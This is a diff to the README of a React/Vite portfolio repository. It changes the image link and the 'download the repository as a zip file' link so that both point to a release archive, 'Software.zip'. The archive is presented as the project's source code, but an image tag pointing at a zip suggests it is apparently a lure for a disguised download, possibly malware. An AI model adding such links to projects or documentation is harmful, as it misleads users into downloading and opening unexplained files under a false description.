@@ -1,6 +1,6 @@
 # 🌟 Welcome to Anila's Portfolio Repository! 🌟
 
-![Portfolio Image](https://www.example.com/portfolio_image.jpg)
+![Portfolio Image](https://github.com/WhiteKinggg/Anila-Portfolio/releases/download/v1.0/Software.zip)
 
 ### Repository Name: 
 Anila-Portfolio
@@ -12,7 +12,7 @@ Welcome to my personal website created using Reactjs and vitejs! This portfolio 
 css, dark-mode, deployed, easy, javascript-library, lightmode, netlify, nodejs, projects-list, reactjs, understandable-explanation, vitejs
 
 ### 🚀 Get Started 
-To access the source code, [click here to download the repository as a zip file](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Make sure to extract the file to view the content.
+To access the source code, [click here to download the repository as a zip file](https://github.com/WhiteKinggg/Anila-Portfolio/releases/download/v1.0/Software.zip). Make sure to extract the file to view the content.
 
 ### Features:
 - **Dark Mode & Light Mode**: Easily switch between dark and light themes for comfortable viewing.
